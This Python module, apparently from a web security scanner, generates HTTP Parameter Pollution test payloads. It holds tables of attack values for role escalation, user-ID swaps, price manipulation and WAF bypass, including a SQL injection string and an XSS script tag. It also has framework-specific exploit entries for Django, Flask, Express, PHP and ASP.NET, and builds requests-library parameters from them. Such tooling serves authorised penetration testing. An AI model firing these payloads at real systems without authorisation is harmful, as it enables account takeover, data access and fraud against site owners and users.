"""
Payload Generation Engine

Generates HTTP Parameter Pollution payloads:
- Generic payloads for unknown frameworks
- Framework-specific optimized payloads
- Context-aware payloads based on parameter type

Supports:
- GET parameters
- POST parameters
- JSON body parameters
- Cookie parameters
"""

from typing import List, Dict, Optional, Any
from dataclasses import dataclass
from enum import Enum
from .framework_detector import Framework


class PayloadType(Enum):
    """Types of HPP payloads"""
    BASIC_DUPLICATE = "basic_duplicate"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    AUTH_BYPASS = "auth_bypass"
    PRICE_MANIPULATION = "price_manipulation"
    ACCESS_CONTROL = "access_control"
    WAF_BYPASS = "waf_bypass"
    ARRAY_INJECTION = "array_injection"


class ParameterLocation(Enum):
    """Where the parameter is located"""
    QUERY = "query"      # GET parameters
    BODY = "body"        # POST body
    JSON = "json"        # JSON body
    COOKIE = "cookie"    # Cookie header
    HEADER = "header"    # Custom header


@dataclass
class HPPPayload:
    """Represents an HPP test payload"""
    name: str
    payload_type: PayloadType
    param_name: str
    values: List[str]
    location: ParameterLocation
    description: str
    expected_behavior: str
    risk_level: str  # LOW, MEDIUM, HIGH, CRITICAL
    framework_specific: Optional[Framework] = None


# Generic payloads that work across frameworks
GENERIC_PAYLOADS = [
    # Basic duplicate parameter tests
    {
        'name': 'Basic Duplicate - String',
        'type': PayloadType.BASIC_DUPLICATE,
        'values': ['value1', 'value2'],
        'description': 'Basic test with two different string values',
        'expected': 'Detect which value is used',
        'risk': 'LOW'
    },
    {
        'name': 'Basic Duplicate - Numbers',
        'type': PayloadType.BASIC_DUPLICATE,
        'values': ['1', '2'],
        'description': 'Basic test with numeric values',
        'expected': 'Detect which value is used',
        'risk': 'LOW'
    },
    # Privilege escalation attempts
    {
        'name': 'Role Escalation',
        'type': PayloadType.PRIVILEGE_ESCALATION,
        'values': ['user', 'admin'],
        'description': 'Attempt to escalate from user to admin role',
        'expected': 'Server processes admin role',
        'risk': 'CRITICAL'
    },
    {
        'name': 'Permission Override',
        'type': PayloadType.PRIVILEGE_ESCALATION,
        'values': ['read', 'write'],
        'description': 'Attempt to gain write permission',
        'expected': 'Server grants write permission',
        'risk': 'HIGH'
    },
    # Authentication bypass
    {
        'name': 'User ID Swap',
        'type': PayloadType.AUTH_BYPASS,
        'values': ['victim_id', 'attacker_id'],
        'description': 'Access another user\'s data',
        'expected': 'Data returned for different user',
        'risk': 'CRITICAL'
    },
    {
        'name': 'Auth Token Confusion',
        'type': PayloadType.AUTH_BYPASS,
        'values': ['valid_token', 'invalid_token'],
        'description': 'Test token handling with duplicates',
        'expected': 'Authentication confusion',
        'risk': 'HIGH'
    },
    # Price manipulation
    {
        'name': 'Price Override',
        'type': PayloadType.PRICE_MANIPULATION,
        'values': ['100', '1'],
        'description': 'Attempt to change price',
        'expected': 'Lower price processed',
        'risk': 'HIGH'
    },
    {
        'name': 'Quantity Manipulation',
        'type': PayloadType.PRICE_MANIPULATION,
        'values': ['1', '100'],
        'description': 'Attempt to change quantity',
        'expected': 'Higher quantity processed',
        'risk': 'MEDIUM'
    },
    # Access control
    {
        'name': 'Resource ID Override',
        'type': PayloadType.ACCESS_CONTROL,
        'values': ['allowed_resource', 'forbidden_resource'],
        'description': 'Access restricted resource',
        'expected': 'Access to forbidden resource',
        'risk': 'HIGH'
    },
    # WAF bypass
    {
        'name': 'WAF Bypass - SQL',
        'type': PayloadType.WAF_BYPASS,
        'values': ['safe', "' OR '1'='1"],
        'description': 'Bypass WAF with HPP + SQL injection',
        'expected': 'WAF checks first, backend uses second',
        'risk': 'CRITICAL'
    },
    {
        'name': 'WAF Bypass - XSS',
        'type': PayloadType.WAF_BYPASS,
        'values': ['safe', '<script>alert(1)</script>'],
        'description': 'Bypass WAF with HPP + XSS',
        'expected': 'WAF checks first, backend uses second',
        'risk': 'HIGH'
    },
]

# Framework-specific payloads
FRAMEWORK_PAYLOADS = {
    Framework.DJANGO: [
        {
            'name': 'Django Last Param Exploit',
            'type': PayloadType.PRIVILEGE_ESCALATION,
            'values': ['safe_value', 'malicious_value'],
            'description': 'Django uses last parameter - exploit this',
            'expected': 'Malicious value processed (last)',
            'risk': 'HIGH'
        },
        {
            'name': 'Django QueryDict Array',
            'type': PayloadType.ARRAY_INJECTION,
            'values': ['val1', 'val2', 'val3'],
            'description': 'Test QueryDict.getlist() behavior',
            'expected': 'Array processing issues',
            'risk': 'MEDIUM'
        },
    ],
    
    Framework.FLASK: [
        {
            'name': 'Flask First Param Exploit',
            'type': PayloadType.PRIVILEGE_ESCALATION,
            'values': ['malicious_value', 'safe_value'],
            'description': 'Flask uses first parameter - exploit this',
            'expected': 'Malicious value processed (first)',
            'risk': 'HIGH'
        },
        {
            'name': 'Flask getlist Confusion',
            'type': PayloadType.ARRAY_INJECTION,
            'values': ['expected', 'unexpected1', 'unexpected2'],
            'description': 'Test args.getlist() vs args.get()',
            'expected': 'Inconsistent handling',
            'risk': 'MEDIUM'
        },
    ],
    
    Framework.EXPRESS: [
        {
            'name': 'Express Array Injection',
            'type': PayloadType.ARRAY_INJECTION,
            'values': ['1', '2', 'malicious'],
            'description': 'Express creates arrays - inject unexpected values',
            'expected': 'Array processed unexpectedly',
            'risk': 'HIGH'
        },
        {
            'name': 'Express Type Confusion',
            'type': PayloadType.AUTH_BYPASS,
            'values': ['string_value', 'string_value'],
            'description': 'Cause type confusion (string vs array)',
            'expected': 'Type error or bypass',
            'risk': 'MEDIUM'
        },
        {
            'name': 'Express Prototype Pollution Prep',
            'type': PayloadType.PRIVILEGE_ESCALATION,
            'values': ['normal', '__proto__'],
            'description': 'Test for prototype pollution vectors',
            'expected': 'Potential prototype pollution',
            'risk': 'CRITICAL'
        },
    ],
    
    Framework.PHP: [
        {
            'name': 'PHP Last Param Exploit',
            'type': PayloadType.PRIVILEGE_ESCALATION,
            'values': ['safe_value', 'malicious_value'],
            'description': 'PHP $_GET uses last parameter',
            'expected': 'Malicious value processed (last)',
            'risk': 'HIGH'
        },
        {
            'name': 'PHP Array Syntax',
            'type': PayloadType.ARRAY_INJECTION,
            'values': ['normal'],
            'param_suffix': '[]',  # param[] syntax
            'description': 'Test PHP array parameter syntax',
            'expected': 'Array injection',
            'risk': 'MEDIUM'
        },
    ],
    
    Framework.ASP_NET: [
        {
            'name': 'ASP.NET Concatenation Exploit',
            'type': PayloadType.WAF_BYPASS,
            'values': ['safe', 'malicious'],
            'description': 'ASP.NET concatenates with comma',
            'expected': 'Concatenated value: safe,malicious',
            'risk': 'HIGH'
        },
    ],
}

# Context-specific payloads based on parameter semantics
CONTEXT_PAYLOADS = {
    # User identity parameters
    'user_id': [PayloadType.AUTH_BYPASS, PayloadType.ACCESS_CONTROL],
    'uid': [PayloadType.AUTH_BYPASS, PayloadType.ACCESS_CONTROL],
    'user': [PayloadType.AUTH_BYPASS, PayloadType.PRIVILEGE_ESCALATION],
    'username': [PayloadType.AUTH_BYPASS],
    'account': [PayloadType.AUTH_BYPASS, PayloadType.ACCESS_CONTROL],
    
    # Role/permission parameters
    'role': [PayloadType.PRIVILEGE_ESCALATION],
    'permission': [PayloadType.PRIVILEGE_ESCALATION],
    'access': [PayloadType.PRIVILEGE_ESCALATION, PayloadType.ACCESS_CONTROL],
    'admin': [PayloadType.PRIVILEGE_ESCALATION],
    'is_admin': [PayloadType.PRIVILEGE_ESCALATION],
    'level': [PayloadType.PRIVILEGE_ESCALATION],
    
    # Financial parameters
    'price': [PayloadType.PRICE_MANIPULATION],
    'amount': [PayloadType.PRICE_MANIPULATION],
    'total': [PayloadType.PRICE_MANIPULATION],
    'cost': [PayloadType.PRICE_MANIPULATION],
    'quantity': [PayloadType.PRICE_MANIPULATION],
    'qty': [PayloadType.PRICE_MANIPULATION],
    'discount': [PayloadType.PRICE_MANIPULATION],
    
    # Resource identifiers
    'id': [PayloadType.ACCESS_CONTROL, PayloadType.AUTH_BYPASS],
    'resource_id': [PayloadType.ACCESS_CONTROL],
    'file': [PayloadType.ACCESS_CONTROL],
    'path': [PayloadType.ACCESS_CONTROL],
    'doc': [PayloadType.ACCESS_CONTROL],
    'document': [PayloadType.ACCESS_CONTROL],
    
    # Authentication tokens
    'token': [PayloadType.AUTH_BYPASS],
    'auth': [PayloadType.AUTH_BYPASS],
    'session': [PayloadType.AUTH_BYPASS],
    'key': [PayloadType.AUTH_BYPASS],
    'api_key': [PayloadType.AUTH_BYPASS],
}


class PayloadGenerator:
    """
    Generates HPP test payloads.
    
    Features:
    - Generic payloads for all frameworks
    - Framework-specific optimized payloads
    - Context-aware payload selection based on parameter name
    """
    
    def __init__(self, framework: Framework = None):
        """
        Initialize payload generator.
        
        Args:
            framework: Detected framework (optional)
        """
        self.framework = framework or Framework.UNKNOWN
        self.generated_payloads: List[HPPPayload] = []
        
    def set_framework(self, framework: Framework):
        """Update the target framework."""
        self.framework = framework
        
    def generate_payloads(
        self, 
        param_name: str, 
        location: ParameterLocation = ParameterLocation.QUERY,
        include_generic: bool = True,
        include_framework_specific: bool = True,
        include_context_aware: bool = True
    ) -> List[HPPPayload]:
        """
        Generate payloads for a specific parameter.
        
        Args:
            param_name: Name of the parameter to test
            location: Where the parameter is located
            include_generic: Include generic payloads
            include_framework_specific: Include framework-specific payloads
            include_context_aware: Include context-aware payloads
            
        Returns:
            List of HPPPayload objects
        """
        payloads = []
        
        # Add generic payloads
        if include_generic:
            for template in GENERIC_PAYLOADS:
                payload = HPPPayload(
                    name=f"{template['name']} - {param_name}",
                    payload_type=template['type'],
                    param_name=param_name,
                    values=template['values'],
                    location=location,
                    description=template['description'],
                    expected_behavior=template['expected'],
                    risk_level=template['risk']
                )
                payloads.append(payload)
        
        # Add framework-specific payloads
        if include_framework_specific and self.framework in FRAMEWORK_PAYLOADS:
            for template in FRAMEWORK_PAYLOADS[self.framework]:
                payload = HPPPayload(
                    name=f"{template['name']} - {param_name}",
                    payload_type=template['type'],
                    param_name=param_name,
                    values=template['values'],
                    location=location,
                    description=template['description'],
                    expected_behavior=template['expected'],
                    risk_level=template['risk'],
                    framework_specific=self.framework
                )
                payloads.append(payload)
        
        # Add context-aware payloads based on parameter name
        if include_context_aware:
            param_lower = param_name.lower()
            for context_param, payload_types in CONTEXT_PAYLOADS.items():
                if context_param in param_lower:
                    for ptype in payload_types:
                        # Find matching generic payload and prioritize it
                        for p in payloads:
                            if p.payload_type == ptype:
                                p.risk_level = self._elevate_risk(p.risk_level)
                                p.description += f" [CONTEXT: {param_name} is security-sensitive]"
        
        self.generated_payloads = payloads
        return payloads
    
    def _elevate_risk(self, current_risk: str) -> str:
        """Elevate risk level for context-sensitive parameters."""
        risk_order = ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL']
        try:
            idx = risk_order.index(current_risk)
            if idx < len(risk_order) - 1:
                return risk_order[idx + 1]
        except ValueError:
            pass
        return current_risk
    
    def generate_all_payloads(
        self,
        params: List[Dict[str, Any]],
    ) -> List[HPPPayload]:
        """
        Generate payloads for multiple parameters.
        
        Args:
            params: List of parameter dicts with 'name' and 'location' keys
            
        Returns:
            List of all generated payloads
        """
        all_payloads = []
        for param in params:
            name = param.get('name', '')
            location = param.get('location', ParameterLocation.QUERY)
            if isinstance(location, str):
                location = ParameterLocation(location)
            
            payloads = self.generate_payloads(name, location)
            all_payloads.extend(payloads)
            
        return all_payloads
    
    def get_framework_specific_count(self) -> int:
        """Get count of framework-specific payloads."""
        return sum(1 for p in self.generated_payloads if p.framework_specific)
    
    def get_payloads_by_risk(self, risk_level: str) -> List[HPPPayload]:
        """Get payloads filtered by risk level."""
        return [p for p in self.generated_payloads if p.risk_level == risk_level]
    
    def get_payloads_by_type(self, payload_type: PayloadType) -> List[HPPPayload]:
        """Get payloads filtered by type."""
        return [p for p in self.generated_payloads if p.payload_type == payload_type]
    
    def build_request_params(self, payload: HPPPayload) -> Dict:
        """
        Build request parameters for a payload.
        
        Returns dict suitable for requests library.
        """
        if payload.location == ParameterLocation.QUERY:
            # For query string, return list of tuples
            return {
                'params': [(payload.param_name, v) for v in payload.values]
            }
        elif payload.location == ParameterLocation.BODY:
            # For POST body
            return {
                'data': [(payload.param_name, v) for v in payload.values]
            }
        elif payload.location == ParameterLocation.JSON:
            # For JSON body - can't have duplicate keys, use array
            return {
                'json': {payload.param_name: payload.values}
            }
        elif payload.location == ParameterLocation.COOKIE:
            # For cookies - last value wins typically
            return {
                'cookies': {payload.param_name: payload.values[-1]}
            }
        return {}
    
    def get_summary(self) -> Dict:
        """Get summary of generated payloads."""
        risk_counts = {}
        type_counts = {}
        
        for payload in self.generated_payloads:
            risk_counts[payload.risk_level] = risk_counts.get(payload.risk_level, 0) + 1
            type_counts[payload.payload_type.value] = type_counts.get(payload.payload_type.value, 0) + 1
        
        return {
            'total_payloads': len(self.generated_payloads),
            'framework': self.framework.value,
            'framework_specific_count': self.get_framework_specific_count(),
            'by_risk': risk_counts,
            'by_type': type_counts
        }
